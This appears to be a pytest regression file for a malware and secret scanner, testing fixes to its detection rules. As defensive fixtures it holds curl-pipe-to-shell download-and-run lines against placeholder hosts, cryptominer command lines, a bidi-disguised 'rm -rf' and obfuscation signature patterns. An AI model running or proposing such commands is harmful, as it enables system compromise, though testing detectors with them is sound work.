"""Defects an independent end-to-end review found, each with its reproduction.

Every one of these was reachable by running the tool, and none was reachable by
running its test suite -- which is the point of keeping them together. Three
were first-run experiences: a macOS user scanning an installed tree, a typed
Python codebase, and a repository somebody had made deep.
"""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.models import Category
from cordon_scanner.detect.binary import BinaryDetector
from cordon_scanner.detect.secrets import ASSIGNMENT, NOT_A_SECRET, names_configuration
from support import assemble

JAVA_CLASS = b"\xca\xfe\xba\xbe" + (0).to_bytes(2, "big") + (65).to_bytes(2, "big") + b"\x00" * 40
FAT_MACHO = b"\xca\xfe\xba\xbe" + (2).to_bytes(4, "big") + b"\x00" * 40
THIN_MACHO = b"\xcf\xfa\xed\xfe" + b"\x00" * 40
ELF = b"\x7fELF" + b"\x00" * 40


def flagged(root) -> set[str]:
    return {
        f.rule_id
        for f in Scanner().scan(root).findings
        if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
    }


class TestASharedObjectIsMachOOnMacOs:
    """`.so` was listed only under ELF. Every compiled Python extension on a
    Mac is a Mach-O `.so`, so scanning any macOS virtualenv reported each of
    them as a file contradicting its own name -- 245 high-severity findings in
    one `site-packages`, and the first thing a Mac user would have seen."""

    @pytest.mark.parametrize("raw", [ELF, THIN_MACHO, FAT_MACHO])
    def test_neither_format_contradicts_a_dot_so(self, raw: bytes) -> None:
        found = BinaryDetector.identify(raw)
        assert BinaryDetector.mismatch("lib/_ssl.cpython-312-darwin.so", found) is None

    def test_a_dot_so_holding_a_script_still_does(self, tmp_path) -> None:
        assert (
            BinaryDetector.mismatch("lib/x.so", BinaryDetector.identify(b"#!/bin/sh\n")) is not None
        )


class TestCafebabeIsTwoFormats:
    """Java class files and Mach-O universal binaries begin with the same four
    bytes. What follows is a class-file version in one and a slice count in the
    other, and the ranges do not overlap."""

    def test_a_universal_binary_is_mach_o(self) -> None:
        assert BinaryDetector.identify(FAT_MACHO).name == "Mach-O executable"
        assert BinaryDetector.mismatch("lib/fat.dylib", BinaryDetector.identify(FAT_MACHO)) is None

    def test_a_class_file_is_still_a_class_file(self) -> None:
        assert BinaryDetector.identify(JAVA_CLASS).name == "Java class"
        assert BinaryDetector.mismatch("A.class", BinaryDetector.identify(JAVA_CLASS)) is None

    def test_a_class_file_wearing_a_dylib_name_is_reported(self) -> None:
        assert BinaryDetector.mismatch("x.dylib", BinaryDetector.identify(JAVA_CLASS)) is not None


class TestATypeAnnotationAssignsNothing:
    """`session_token: AuthenticationBackendXY` declares a type. There is no
    value in the file at all, and a typed codebase produces these by the
    hundred."""

    @pytest.mark.parametrize(
        "value",
        [
            "AuthenticationBackendXY",
            "HTTPPasswordMgrWithDefaultRealm",
            "SomeVeryLongTypeNameHere",
            "OptionalStr",
        ],
    )
    def test_a_type_name_is_not_a_credential(self, value: str) -> None:
        assert NOT_A_SECRET.match(value.encode()) is not None

    @pytest.mark.parametrize(
        "line",
        ["session_token: AuthenticationBackendXY", "passwd: HTTPPasswordMgrWithDefaultRealm"],
    )
    def test_end_to_end(self, tmp_path, line: str) -> None:
        (tmp_path / "a.py").write_text(f"{line}\n", encoding="utf-8")
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)

    @pytest.mark.parametrize(
        "value", ["aB3kQ9mZ2xT7vL4nR8wY", "S3cr3tP4ssw0rdXyz9Qq", "glpat-AAAAAAAAAAAAAAAA"]
    )
    def test_key_material_is_still_key_material(self, value: str) -> None:
        assert NOT_A_SECRET.match(value.encode()) is None


class TestASphinxRoleIsDocumentation:
    """Prose reaches the assignment rule because the name group matches inside
    a word: "bypasses" ends in "pass" plus "es". A role after it has a colon
    and no whitespace, which is the shape the unquoted branch looks for."""

    @pytest.mark.parametrize(
        "value",
        ["meth:`cordon.registry.Registry.new`", "class:`~cordon.Scanner`", "ref:`configuration`"],
    )
    def test_a_cross_reference_is_not_a_credential(self, value: str) -> None:
        assert NOT_A_SECRET.match(value.encode()) is not None


class TestAClassStatementAssignsNothing:
    """`class AuthTokenService:` is a definition, and the assignment pattern
    read the line below it as the value.

    The operator carried `\\s*` on both sides, and `\\s` is a newline. So the
    name group matched `AuthTokenService`, the colon matched, the value became
    whatever run of non-punctuation opened the class body, and `@staticmethod`
    is thirteen characters of exactly that. Nine findings in one Django
    codebase, every one a service class, each reported as "a credential
    assigned to \'AuthTokenService\'".

    Worse than the count: a reviewer who opens the file sees a class statement
    and a decorator. Nothing in the finding can be acted on, and a rule that
    cannot be acted on is the one that gets switched off -- taking the real
    `SECRET_KEY = "..."` in the same repository with it.

    An assignment puts its value on the same line as its name. A value on a
    later line is a class body, a YAML mapping or the next statement, never the
    thing that was assigned; and the multi-line case that is real -- a literal
    built across several lines -- is matched by the assembled path, which knows
    to look for a joiner. So the fix is horizontal whitespace only, which also
    closes the `\\r` form of the same mistake.
    """

    @pytest.mark.parametrize(
        "source",
        [
            "class AuthTokenService:\n\n    @staticmethod\n    def issue():\n        return 1\n",
            "class PasswordResetView:\n\n    @property\n    def form(self):\n        return 1\n",
            "class ClientSecretRotator:\n\n    @classmethod\n    def rotate(cls):\n        return 1\n",
            "class CredentialStore:\n\n    @cached_property\n    def backend(self):\n        return 1\n",
        ],
    )
    def test_a_class_body_is_not_a_value(self, source: str) -> None:
        assert ASSIGNMENT.search(source.encode()) is None

    def test_the_same_shape_with_windows_line_endings(self) -> None:
        """`\\r` is whitespace too, so a checkout with CRLF endings produced the
        identical finding and would have survived a fix that excluded only
        `\\n`."""
        assert ASSIGNMENT.search(b"class AuthTokenService:\r\n\r\n    @staticmethod\r\n") is None

    @pytest.mark.parametrize(
        "source",
        [
            b"api_key:\n  fromEnvironmentVariable\n",
            b"password:\n  secretKeyRef.name.value\n",
        ],
    )
    def test_a_mapping_key_does_not_borrow_the_next_line(self, source: bytes) -> None:
        """The same mistake outside Python: a YAML key whose value is a nested
        block, where the first token of that block was read as the key's value.

        It needed twelve characters on the line below to reach the floor, which
        is why most manifests escaped and the ones using descriptive names did
        not. `NOT_A_SECRET` would have rejected both of these afterwards on
        shape, and that is not a reason to let the pattern match: the filter is
        a second line of defence over a list of shapes somebody thought of, and
        the first line is not reading a value that was never assigned.
        """
        assert ASSIGNMENT.search(source) is None

    @pytest.mark.parametrize(
        "line",
        [
            'DEMO_PASSWORD = "{}"',
            "SECRET_KEY: '{}'",
            "api_token={}",
            'password\t=\t"{}"',
            'client_secret  =  "{}"',
        ],
    )
    def test_an_assignment_on_one_line_still_matches(self, line: str) -> None:
        """The other half of the fix, and the half a narrowing change can break
        silently: every spacing an assignment is actually written with."""
        # Assembled: this file is scanned by the tool it tests.
        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
        assert ASSIGNMENT.search(line.format(value).encode()) is not None

    def test_a_service_class_scans_clean_end_to_end(self, tmp_path) -> None:
        (tmp_path / "services.py").write_text(
            "class AuthTokenService:\n"
            "\n"
            "    @staticmethod\n"
            "    def issue(user):\n"
            "        return user.pk\n"
            "\n"
            "\n"
            "class ClientSecretRotator:\n"
            "\n"
            "    @classmethod\n"
            "    def rotate(cls, account):\n"
            "        return account\n",
            encoding="utf-8",
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)

    def test_a_credential_in_the_same_file_still_fires(self, tmp_path) -> None:
        """The guard that makes the test above mean something. A fix that
        stopped the rule firing at all would pass it."""
        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
        (tmp_path / "settings.py").write_text(
            "class AuthTokenService:\n"
            "\n"
            "    @staticmethod\n"
            "    def issue(user):\n"
            "        return user.pk\n"
            "\n"
            "\n"
            f'DEMO_PASSWORD = "{value}"\n',
            encoding="utf-8",
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)

    def test_the_detector_version_moved_with_the_behaviour(self) -> None:
        """`ScanCache.detector_signature` is `id@version`, and it is the only
        input that invalidates a cached result when a detector's behaviour
        changes -- file content, rulepack hash and config are all unchanged by a
        fix like this one. Left alone, everyone who upgrades keeps being served
        the false positives out of the cache, and the release does nothing for
        the people who already ran a scan."""
        from cordon_scanner.detect.secrets import SecretDetector

        assert SecretDetector.version > "0.2.0"


class TestADeepTreeIsNotASilentSkip:
    """`max_path_depth` incremented a counter shared with `node_modules` and
    every configured exclusion, so it reached no finding. A payload under
    seventy directories gave `files_scanned: 1`, `complete: true`, no findings
    and exit 0 -- a one-command evasion of the whole scan."""

    @staticmethod
    def build(tmp_path, depth: int):
        deep = tmp_path
        for index in range(depth):
            deep = deep / f"d{index:02d}"
        deep.mkdir(parents=True)
        (deep / "payload.py").write_text("import os\n", encoding="utf-8")
        (tmp_path / "top.py").write_text("x = 1\n", encoding="utf-8")
        return tmp_path

    def test_the_scan_says_it_did_not_finish(self, tmp_path) -> None:
        result = Scanner().scan(self.build(tmp_path, 70))
        assert result.complete is False

    def test_and_names_what_it_could_not_reach(self, tmp_path) -> None:
        result = Scanner().scan(self.build(tmp_path, 70))
        reported = [f for f in result.findings if f.rule_id == "OPERATIONAL.WALK.TOO_DEEP"]
        assert len(reported) == 1
        assert "not examined" in reported[0].message

    def test_an_ordinary_tree_says_nothing(self, tmp_path) -> None:
        result = Scanner().scan(self.build(tmp_path, 3))
        assert result.complete is True
        assert not [f for f in result.findings if f.rule_id == "OPERATIONAL.WALK.TOO_DEEP"]


class TestTRexIsAlsoADinosaur:
    """Every other miner name in the list is a coined word. `t-rex` is a key in
    rich's emoji table, which pip vendors and many projects vendor after it."""

    def test_an_emoji_table_is_not_a_cryptominer(self, tmp_path) -> None:
        (tmp_path / "codes.py").write_text(
            'EMOJI = {\n    "t-rex": "\\U0001F996",\n    "sauropod": "\\U0001F995",\n}\n',
            encoding="utf-8",
        )
        assert "SUSPECT.CRYPTOMINER.001" not in flagged(tmp_path)

    def test_the_miner_with_its_flags_still_is(self, tmp_path) -> None:
        line = assemble("t-", "rex.exe -a ethash -o strat", "um+tcp://eth.pool.invalid:4444")
        (tmp_path / "run.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
        assert "SUSPECT.CRYPTOMINER.001" in flagged(tmp_path)

    def test_the_unambiguous_names_are_untouched(self, tmp_path) -> None:
        line = assemble("xm", "rig --don", "ate-level 1")
        (tmp_path / "run.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
        assert "SUSPECT.CRYPTOMINER.001" in flagged(tmp_path)


class TestCargoBuildOutputIsActuallyPruned:
    """`target/debug` and `target/release` were in a set matched against a
    single directory *name*, so neither string could ever match and Rust build
    output was never pruned at all."""

    def test_build_output_is_skipped(self, tmp_path) -> None:
        for part in ("target/debug", "target/release", "src", "mytarget"):
            (tmp_path / part).mkdir(parents=True)
        (tmp_path / "src" / "main.rs").write_text("fn main() {}\n", encoding="utf-8")
        (tmp_path / "mytarget" / "keep.rs").write_text("fn keep() {}\n", encoding="utf-8")
        for part in ("target/debug", "target/release"):
            (tmp_path / part / "app").write_text("junk\n", encoding="utf-8")

        result = Scanner().scan(tmp_path)
        assert result.stats.files_scanned == 2, "src/main.rs and mytarget/keep.rs, nothing else"

    def test_a_directory_merely_called_target_is_not(self, tmp_path) -> None:
        """`target` is an ordinary directory name in plenty of projects, so the
        relative path is what identifies the artefact directory."""
        (tmp_path / "target").mkdir()
        (tmp_path / "target" / "main.rs").write_text("fn main() {}\n", encoding="utf-8")
        assert Scanner().scan(tmp_path).stats.files_scanned == 1


class TestAnInstallHookInASubdirectory:
    """`os.path.normpath` on Windows rewrites `/` as `\\`.

    Scan paths are POSIX everywhere, so a `postinstall` naming
    `scripts/setup.js` resolved to `scripts\\setup.js`, matched nothing, and the
    file was never marked as running at install time. Every `MALWARE.*`
    composite requiring install-hook context then downgraded to its `SUSPECT.*`
    counterpart -- weaker findings on Windows for one of the commonest layouts
    there is, and silently, because a finding was still produced.

    It survived because every corpus sample put its hook at the top level,
    where there is no separator to rewrite.
    """

    KNOWN = frozenset(
        {"package.json", "postinstall.js", "scripts/setup.js", "packages/api/build/run.js"}
    )

    @staticmethod
    def resolve(manifest: str, command: str) -> set[str]:
        from cordon_scanner.core.engine import Engine
        from cordon_scanner.core.models import Hook

        hook = Hook(kind="npm", path=manifest, name="postinstall", command=command)
        return Engine._hook_script_paths(manifest, [hook], TestAnInstallHookInASubdirectory.KNOWN)

    @pytest.mark.parametrize(
        ("manifest", "command", "expected"),
        [
            ("package.json", "node scripts/setup.js", {"scripts/setup.js"}),
            ("package.json", "node ./scripts/setup.js", {"scripts/setup.js"}),
            ("package.json", "node postinstall.js", {"postinstall.js"}),
            ("packages/api/package.json", "node build/run.js", {"packages/api/build/run.js"}),
        ],
    )
    def test_a_nested_target_resolves(self, manifest, command, expected) -> None:
        assert self.resolve(manifest, command) == expected

    def test_the_resolution_does_not_depend_on_the_host_separator(self) -> None:
        """The guard that makes this platform-independent rather than merely
        passing on the platform it was written on: resolution must go through
        `posixpath`, whose behaviour is the same everywhere, and not through
        `os.path`, whose behaviour is not."""
        import ntpath
        import posixpath
        import unittest.mock

        from cordon_scanner.core import engine

        # `ntpath` is what `os.path` *is* on Windows. Substituting it here
        # reproduces the Windows result on any host: if anything in the
        # resolution still reaches for the platform's own module, this fails.
        with unittest.mock.patch.object(engine, "posixpath", posixpath):
            assert self.resolve("package.json", "node scripts/setup.js") == {"scripts/setup.js"}
        assert ntpath.normpath("scripts/setup.js") == "scripts\\setup.js", (
            "the bug this guards against: the Windows normpath rewrites the separator"
        )

    def test_traversal_out_of_the_tree_is_still_refused(self) -> None:
        assert self.resolve("package.json", "node ../../etc/evil.js") == set()


class TestASecurityToolsOwnSignatureFileIsNotObfuscated:
    """`# _$_1e42-style obfuscated identifiers` is a comment describing a pattern.

    Four HIGH findings across four repositories, every one on the same line of
    `scripts/security/scan-malware.sh` -- a list of quoted regexes a malware
    scanner greps for, with English comments beside them. Cordon read the comment
    as the thing the comment describes.

    This is the canonical false positive for the rule class. Every scanner in this
    category hits it, because a signature file is by construction a file full of
    attack signatures.

    Two conditions now. The signature must be in a file whose language could be
    the obfuscator's output -- every shape in `PACKERS` is JavaScript, and matching
    one in a shell script is a category error -- and the two identifier schemes
    need several occurrences, because `_0x4f2a` and `_$_1e42` are how an obfuscator
    NAMES things, so real output carries hundreds and one occurrence is a file
    talking about the scheme.

    Note what is deliberately NOT done: no path is exempted. A JavaScript payload
    appended to that same shell script would still be reported, because the gate is
    the language the signature belongs to and nothing about who owns the file.
    """

    SIGNATURE_FILE = (
        "#!/usr/bin/env bash\n"
        "PATTERNS=(\n"
        '  "eval\\\\(function\\\\(p,a,c,k,e,"        # Dean Edwards packer\n'
        '  "_\\\\$_[0-9a-fA-F]{3,}"                 # _$_1e42-style identifiers\n'
        '  "_0x[0-9a-f]{4,6}"                      # obfuscator.io identifiers\n'
        ")\n"
        'grep -nE "${PATTERNS[@]}" -r . || true\n'
    )

    def test_a_shell_signature_list_is_quiet(self, tmp_path) -> None:
        (tmp_path / "scan-malware.sh").write_text(self.SIGNATURE_FILE, encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.PACKED.001" not in flagged(tmp_path)

    def test_a_python_signature_list_is_quiet(self, tmp_path) -> None:
        """The same file in another language. The fix is the language gate, so it
        must not be specific to shell."""
        (tmp_path / "signatures.py").write_text(
            "PACKERS = [\n"
            '    r"eval\\\\(function\\\\(p,a,c,k,e,",  # Dean Edwards packer\n'
            '    r"_\\\\$_[0-9a-fA-F]{3,}",           # _$_1e42-style identifiers\n'
            "]\n",
            encoding="utf-8",
        )
        assert "SUSPECT.OBFUSCATION.PACKED.001" not in flagged(tmp_path)

    def test_real_packer_output_still_fires(self, tmp_path) -> None:
        (tmp_path / "bundle.js").write_text(
            "eval(function(p,a,c,k,e,d){return p}('0 1',2,2,'var|x'.split('|'),0,{}))\n",
            encoding="utf-8",
        )
        assert "SUSPECT.OBFUSCATION.PACKED.001" in flagged(tmp_path)

    def test_real_identifier_obfuscation_still_fires(self, tmp_path) -> None:
        """The count threshold, from the other side. Obfuscator output is made of
        these names, so the many-occurrence case has to keep working."""
        body = "".join(f"var _0x{i:04x} = {i};\n" for i in range(1, 40))
        (tmp_path / "app.js").write_text(body, encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.PACKED.001" in flagged(tmp_path)

    def test_one_mention_in_javascript_is_not_enough(self, tmp_path) -> None:
        """A JavaScript file that documents the scheme rather than using it -- a
        test fixture, a linter rule, a comment."""
        (tmp_path / "lint.js").write_text(
            "// Reject minified identifiers such as _0x4f2a, which review cannot read.\n"
            "export const PATTERN = /_0x[0-9a-f]{4,6}/;\n",
            encoding="utf-8",
        )
        assert "SUSPECT.OBFUSCATION.PACKED.001" not in flagged(tmp_path)


class TestALongLineInProseIsATable:
    """A 3,333-character architecture table reported as a long high-entropy line.

    The rule's whole reasoning is that a payload appended to a source file is often
    one long line, because that keeps it off-screen in a diff. That argument needs
    the file to be something that runs, and nothing executes a Markdown document.

    It already declined to fire on files with no identified language, on exactly
    this reasoning -- "a long line in data is what data looks like". Markdown is
    identified, so it fell through the gap. Mixed case, punctuation and pipe
    separators put any table row over the entropy floor, so tightening the floor
    would not have separated them and would have cost real detections elsewhere.
    """

    @staticmethod
    def table_row(width: int = 3_400) -> str:
        cells = [f"**`module{i}`** | Complete | Owns domain metrics (S{i})" for i in range(60)]
        row = "| " + " | ".join(cells) + " |"
        return row[:width] + "\n"

    def test_a_wide_markdown_table_is_quiet(self, tmp_path) -> None:
        (tmp_path / "DESIGN.md").write_text(
            "# Design\n\n| Module | Status | Notes |\n| --- | --- | --- |\n" + self.table_row(),
            encoding="utf-8",
        )
        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)

    def test_the_same_line_in_javascript_still_fires(self, tmp_path) -> None:
        """The guard that keeps the exemption about prose rather than about length.
        If this stops firing, the rule has been switched off rather than scoped."""
        import secrets as _secrets

        payload = _secrets.token_urlsafe(3_000)[:3_400]
        (tmp_path / "app.js").write_text(f"const x = 1;\nconst blob = '{payload}';\n", "utf-8")
        assert "SUSPECT.OBFUSCATION.LONGLINE.001" in flagged(tmp_path)

    def test_prose_is_exempt_from_length_only(self, tmp_path) -> None:
        """Bidi, escapes and the packer shapes still apply to Markdown, which is
        right: a directional override in a README is a live attack on whoever
        copies a command out of it."""
        (tmp_path / "README.md").write_text(
            f"Run this: `rm -rf {chr(0x202E)}/tmp/safe`\n", encoding="utf-8"
        )
        assert "SUSPECT.OBFUSCATION.BIDI.001" in flagged(tmp_path)


class TestANameEndingInPathHoldsAPath:
    """`REFRESH_TOKEN_COOKIE_PATH=/api/v1/auth/token/refresh/` at HIGH, as "a
    credential assigned to 'REFRESH_TOKEN_COOKIE_PATH'". The value is a URL path
    and the name says so.

    Matched on the NAME, and the reason is the interesting part. `NOT_A_SECRET`
    already has a path alternative; it refuses this value only because `v1` carries
    a digit and because of the trailing slash. Widening that alternative was the
    obvious fix and would have been a bad trade: a real AWS secret key looks like
    `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` -- slashes, digits,
    segment-shaped -- so a path shape permissive enough to accept a versioned URL
    accepts that too, and the rule goes quiet on the credential it exists to find.

    A name is safer ground because a developer chose it to describe the value.
    """

    @pytest.mark.parametrize(
        "name",
        [
            "REFRESH_TOKEN_COOKIE_PATH",
            "PRIVATE_KEY_PATH",
            "SECRET_KEY_FILE",
            "AUTH_TOKEN_HEADER",
            "API_KEY_PARAM",
            "PASSWORD_MIN_LENGTH",
            "JWT_ALGORITHM",
            "TOKEN_URL",
            "CREDENTIAL_PREFIX",
        ],
    )
    def test_a_configuration_name_is_not_a_credential(self, name: str) -> None:
        assert names_configuration(name)

    @pytest.mark.parametrize(
        "name",
        ["SECRET_KEY", "API_KEY", "DEMO_PASSWORD", "password", "auth_token", "SECRET_KEYFILE"],
    )
    def test_a_credential_name_still_is(self, name: str) -> None:
        """`KEY` is deliberately not a configuration ending, and the match is on
        whole words: `SECRET_KEYFILE` is one word ending in `keyfile`, which is not
        the same shape as `SECRET_KEY_FILE`."""
        assert not names_configuration(name)

    def test_end_to_end(self, tmp_path) -> None:
        (tmp_path / ".env.example").write_text(
            "REFRESH_TOKEN_COOKIE_PATH=/api/v1/auth/token/refresh/\n", encoding="utf-8"
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)

    def test_a_real_secret_beside_it_still_fires(self, tmp_path) -> None:
        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
        (tmp_path / ".env.example").write_text(
            f"REFRESH_TOKEN_COOKIE_PATH=/api/v1/auth/token/refresh/\nSECRET_KEY={value}\n",
            encoding="utf-8",
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)

    def test_widening_the_path_shape_would_have_hidden_a_key(self) -> None:
        """The trade this avoided, asserted so the temptation is documented.

        An AWS secret key is slash-separated, digit-bearing and segment-shaped. A
        path alternative loose enough to accept `/api/v1/auth/token/refresh/` would
        accept this, and `NOT_A_SECRET` is consulted before anything else.
        """
        aws_shaped = assemble("wJalrXUtnFEMI/K7MDENG/", "bPxRfiCY3XAMPL3K3Y").encode()
        assert NOT_A_SECRET.match(aws_shaped) is None


class TestAPrintedCommandIsNotAnExecutedOne:
    """`spf13/cobra` reported at CRITICAL, in the MALICIOUS category, for a
    Makefile line that prints installation advice.

        ifeq (, $(shell which golangci-lint))
        $(warning "could not find golangci-lint, run: curl -sfL https://... | sh")
        endif

    That is the text shown to a developer who is missing a tool. Cordon read the
    `curl ... | sh` inside it as a dropper and reported both MALWARE.DROPPER.001 and
    SUSPECT.DROPPER.001 on the same line. An accusation of that weight against a
    printed help message is not a tuning problem: it is the finding that ends the
    conversation about adopting the tool, on one of the most depended-upon Go
    libraries there is.

    Install instructions inside diagnostics, READMEs and `echo` lines are
    everywhere, because piping a script into a shell is how a great deal of
    software documents its own installation.

    Two conditions, and the second is what stops this becoming a hole: the
    statement must be a printer, AND the match must lie entirely inside its quoted
    argument.
    """

    @staticmethod
    def suppressed(source: str) -> bool:
        import re

        from cordon_scanner.core.content import FileContent
        from cordon_scanner.detect.capability import CapabilityDetector

        raw = source.encode()
        content = FileContent(path="Makefile", raw=raw, size=len(raw))
        match = re.search(rb"curl", raw)
        assert match is not None
        return CapabilityDetector._is_printed_text(content, match.start(), match.end())

    @pytest.mark.parametrize(
        "source",
        [
            '$(warning "could not find golangci-lint, run: curl -sfL https://x.test/i | sh")\n',
            '$(info "install with: curl https://x.test/i | bash")\n',
            '\techo "To install: curl -sfL https://get.test/x | sh"\n',
            '\t@echo "run: curl https://x.test/s | bash"\n',
            'console.log("install with: curl https://x.test/i | sh")\n',
            '\techo "couldn\'t find it, run: curl https://x.test/i | sh"\n',
        ],
    )
    def test_a_printed_instruction_is_text(self, source: str) -> None:
        assert self.suppressed(source)

    @pytest.mark.parametrize(
        "source",
        [
            "curl -sfL https://x.test/i.sh | sh\n",
            # Quoted is not inert. A shell runs `$(...)` and backticks inside DOUBLE
            # quotes, so these really do fetch and execute -- the quotes are around
            # the output, not around the command. Suppressing the egress here would
            # have taken one half of the dropper composite away from a genuine
            # fetch-and-run, which is the hole the quote test alone would have left.
            '\techo "$(curl -s https://x.test/s)" | sh\n',
            '\techo "`curl -s https://x.test/s`" | sh\n',
            '$(warning "$(shell curl -s https://x.test/s)")\n',
        ],
    )
    def test_a_real_fetch_is_not_suppressed(self, source: str) -> None:
        assert not self.suppressed(source)

    def test_single_quotes_stay_inert(self) -> None:
        """Single quotes suppress substitution in every shell, so a `$(...)` inside
        them is literal text and stays suppressed."""
        assert self.suppressed("\techo 'literal $(curl https://x.test/s)'\n")

    def test_the_cobra_makefile_end_to_end(self, tmp_path) -> None:
        (tmp_path / "Makefile").write_text(
            'BIN="./bin"\n'
            "\n"
            "ifeq (, $(shell which golangci-lint))\n"
            '$(warning "could not find golangci-lint in $(PATH), run: '
            'curl -sfL https://install.test/golangci-lint.sh | sh")\n'
            "endif\n"
            "\n"
            "lint:\n"
            "\tgolangci-lint run -v\n",
            encoding="utf-8",
        )
        found = flagged(tmp_path)
        assert "MALWARE.DROPPER.001" not in found
        assert "SUSPECT.DROPPER.001" not in found

    def test_a_real_dropper_in_a_makefile_still_fires(self, tmp_path) -> None:
        """The guard. A fix that stopped the rule firing in Makefiles would pass
        the test above."""
        (tmp_path / "Makefile").write_text(
            "setup:\n\tcurl -sfL https://install.test/payload.sh | sh\n",
            encoding="utf-8",
        )
        assert {"MALWARE.DROPPER.001", "SUSPECT.DROPPER.001"} & flagged(tmp_path)


class TestACommentedOutSettingConfiguresNothing:
    """Celery's Helm chart reported at HIGH as "container adds a capability that
    escapes the sandbox", for this:

        securityContext: {}
          # capabilities:
          #   drop:
          #   - ALL

    Two things wrong at once, and the comment is the lesser of them. `drop: ALL` is
    the most hardened setting a container can have, and the rule had no `add`
    requirement -- so it was telling projects their best practice was a sandbox
    escape, commented out or not.

    The rule already carried a note about a near miss of the same kind: an earlier
    version matched the phrase "nothing to drop into at all" in a comment in this
    project's own Dockerfile, and was anchored to work around it. That is a fix per
    rule. Comments are a property of the file.
    """

    @staticmethod
    def masked(raw: bytes) -> bytes:
        from cordon_scanner.detect.config_files import ConfigDetector

        return ConfigDetector._without_comments(raw)

    def test_offsets_are_preserved(self) -> None:
        """Blanked, not removed, so every span and line number a finding reports
        still points where it pointed."""
        raw = b"a: 1  # comment\nb: 2\n"
        assert len(self.masked(raw)) == len(raw)
        assert self.masked(raw).startswith(b"a: 1  ")

    def test_a_hash_inside_quotes_is_not_a_comment(self) -> None:
        """`password: "a#b"` is a password. Blanking from that `#` would hide real
        content, and hiding content in a security scanner is a false negative."""
        # Assembled: this file is scanned by the tool it tests, and a
        # credential-shaped literal here is one the self-scan reports.
        raw = f'password: "{assemble("aB3kQ9#mZ", "2xT7vL4")}"\n'.encode()
        assert self.masked(raw) == raw

    def test_the_hardened_setting_is_not_an_escape(self, tmp_path) -> None:
        (tmp_path / "pod.yaml").write_text(
            "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: app\n"
            '      securityContext:\n        capabilities:\n          drop: ["ALL"]\n',
            encoding="utf-8",
        )
        assert "SUSPECT.K8S.CAPABILITIES.001" not in flagged(tmp_path)

    def test_a_commented_block_is_not_a_setting(self, tmp_path) -> None:
        (tmp_path / "values.yaml").write_text(
            "apiVersion: v2\nsecurityContext: {}\n"
            "  # capabilities:\n  #   drop:\n  #   - ALL\n"
            "  # readOnlyRootFilesystem: true\n",
            encoding="utf-8",
        )
        assert "SUSPECT.K8S.CAPABILITIES.001" not in flagged(tmp_path)

    def test_a_real_capability_grant_still_fires(self, tmp_path) -> None:
        (tmp_path / "pod.yaml").write_text(
            "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n    - name: app\n"
            '      securityContext:\n        capabilities:\n          add: ["SYS_ADMIN"]\n',
            encoding="utf-8",
        )
        assert "SUSPECT.K8S.CAPABILITIES.001" in flagged(tmp_path)

    def test_cap_add_stands_alone(self, tmp_path) -> None:
        """`cap_add` and `CapAdd` already say `add` in the key."""
        (tmp_path / "docker-compose.yml").write_text(
            "apiVersion: ignored\nservices:\n  app:\n    cap_add:\n      - SYS_PTRACE\n",
            encoding="utf-8",
        )
        assert "SUSPECT.K8S.CAPABILITIES.001" in flagged(tmp_path)


class TestOneCredentialIsOneFinding:
    """Celery's test keypairs came back eight times at CRITICAL, and two of those
    were the same key reported twice.

    Deduplication inside each path is by the hash of the matched VALUE, and two
    paths matching different slices of one credential do not share it: the provider
    pattern matched the PEM header, and the assembled-literal path folded the Python
    triple-quoted string around it. Different bytes, different hash, same key, and
    nothing in the report to tell a reader that from two keys.

    A post-filter rather than a guard in each path, because the duplication is
    BETWEEN paths -- which is how the first attempt at this missed it entirely.
    """

    def test_one_finding_per_key(self, tmp_path) -> None:
        from cordon_scanner.detect.secrets import SecretDetector

        header = assemble("-----BEGIN RSA ", "PRIVATE KEY-----")
        body = assemble("MIICXQIBAAKBgQC9Twh0V5q", "R1Q8NYCNM4lj9AXeZL0gYowoK1ht2ZLCDU9vN5")
        (tmp_path / "keys.py").write_text(
            f'KEY1 = """{header}\n{body}\n{assemble("-----END RSA ", "PRIVATE KEY-----")}"""\n',
            encoding="utf-8",
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        keys = [f for f in result.findings if f.rule_id == "SECRET.PRIVATE_KEY.001"]
        assert len(keys) == 1, [f.evidence.span for f in keys]
        assert SecretDetector.version  # the detector that owns the post-filter

    def test_two_keys_are_two_findings(self, tmp_path) -> None:
        """The guard: collapsing by rule id alone would report one."""
        header = assemble("-----BEGIN RSA ", "PRIVATE KEY-----")
        (tmp_path / "keys.py").write_text(
            f'KEY1 = """{header}\n{assemble("MIICXQIBAAKBgQC9Twh0V5q", "R1Q8NYCNM4lj9AXe")}\n"""\n'
            f'KEY2 = """{header}\n{assemble("MIICXQIBAAKBgQDdUwj1W6r", "S2R9OZDON5mk0BYfaM1it")}\n"""\n',
            encoding="utf-8",
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        keys = [f for f in result.findings if f.rule_id == "SECRET.PRIVATE_KEY.001"]
        assert len(keys) == 2, [f.evidence.span for f in keys]


class TestWhereProjectsActuallyKeepTestMaterial:
    """Celery keeps eight RSA test keypairs under `t/unit/security/`, and every
    `test`-shaped glob missed a directory called `t`.

    Reported at CRITICAL, eight times, on a file whose own docstring opens "Keys and
    certificates for tests" and names the script that generated them. That is the
    shape that gets a secret scanner switched off: the project cannot act on it,
